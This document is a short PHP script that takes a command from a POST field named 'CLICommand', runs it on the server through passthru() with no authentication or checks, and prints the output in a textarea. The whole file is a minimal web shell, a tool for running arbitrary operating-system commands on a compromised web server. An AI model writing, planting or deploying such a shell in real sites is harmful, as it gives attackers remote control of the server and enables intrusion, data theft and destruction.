<?php
if (isset($_POST['CLICommand']))
{
	echo "<pre>";
	echo "<b>Output From Command: </b><br />";
	echo "<textarea cols='120' rows='25'>";
	passthru($_POST['CLICommand']);
	echo "</textarea>";
}
?>